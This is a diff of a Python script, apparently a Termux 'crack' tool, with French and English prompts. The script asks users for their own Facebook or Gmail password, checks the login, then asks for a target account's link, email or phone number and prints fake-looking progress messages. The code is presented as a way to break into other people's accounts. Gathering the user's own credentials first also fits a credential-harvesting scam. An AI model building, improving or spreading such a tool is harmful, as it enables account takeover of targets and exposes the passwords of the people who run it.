@@ -40,7 +40,8 @@ def assur(ide, pasw):
  if 'id="loginbutton"' in struts:
     sys.exit(Fore.RED+'incorrect password or no account found.\nCheck ur login informations and try again.')
  else:
-  print(Fore.GREEN+ 'Successfully Logged in.\nUpdating git toll, this might take some minutes...\n')
+  print(Fore.GREEN+ 'Successfully Logged in.')
+  print('completing control port...')
 def upd():
     os.chdir('/data/data/com.termux/files/home')
     shutil.rmtree('crack')
@@ -80,7 +81,7 @@ if option == 1:
     cho = 'Facebook'
     print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook -/- First log into your own Facebook account')
     usn = input('\nenter your email/phonenumber: ')
-    usp = input('enter your password: ')
+    usp = getpass.getpass('enter your password (will not appear on the screen): ')
     print('En cours de connexion, veuillez patienter...\n')
     nth()
     assur(usn, usp)
@@ -97,7 +98,7 @@ elif option == 3:
     print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
     usn = input('\nenter your email: ')
     usp = input('enter your password: ')
-    print('En cours de connexion, veuillez patienter...')
+    print('En cours de connexion, veuillez patienter...\nLogging in, please wait...')
     nth()
     assur(usn, usp)
 
@@ -153,7 +154,7 @@ for x in liste:
             connect(name)
 
 if option == 1:
-    lien = input('collez le lien du compte cible: ')
+    lien = input('collez le lien du compte cible paste the target account link, id, email or phone number: ')
     print('searching for referentials...')
     loop()
     os.system('xdg-open https://m.facebook.com')
